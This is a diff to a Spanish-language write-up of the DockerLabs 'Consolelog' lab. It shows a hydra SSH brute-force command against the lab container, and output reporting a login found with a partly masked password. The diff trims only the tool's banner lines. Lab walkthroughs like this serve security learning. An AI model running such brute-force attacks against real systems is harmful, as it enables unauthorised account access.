@@ -124,11 +124,7 @@ Probamos a ver si la contraseña pertenece a algún usuario por SSH empleando `h
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Consolelog]
 └─$ hydra -L /usr/share/seclists/Passwords/rockyou.txt -p lapa******************************** ssh://172.17.0.2:5000 -t 64 -I 
-Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-26 15:43:12
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:14344399/p:1), ~224132 tries per task
 [DATA] attacking ssh://172.17.0.2:5000/
 [5000][ssh] host: 172.17.0.2   login: l****   password: lapa********************************
